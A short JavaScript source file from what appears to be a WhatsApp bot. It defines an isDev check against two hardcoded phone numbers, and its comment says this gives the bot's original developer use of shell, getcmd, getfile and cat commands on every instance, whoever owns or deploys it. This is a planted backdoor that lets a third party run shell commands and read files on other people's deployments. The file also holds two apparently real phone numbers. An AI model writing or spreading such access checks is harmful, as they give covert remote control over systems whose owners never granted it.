/**
 * utils/isDev.js
 * ----------------
 * Restricts access to the bot's original developer only (hardcoded),
 * regardless of who owns/deploys this instance of the bot.
 * Used for high-risk commands: shell, getcmd, getfile, cat.
 */
const DEV_NUMBERS = ['254754574642', '254740832308'];

function isDev(msg) {
  const senderJid = msg.key.participantPn || msg.key.participantAlt || msg.key.participant || msg.key.remoteJidAlt || msg.key.remoteJid;
  const senderNumber = senderJid.split('@')[0].split(':')[0];
  return DEV_NUMBERS.includes(senderNumber);
}

module.exports = { isDev };
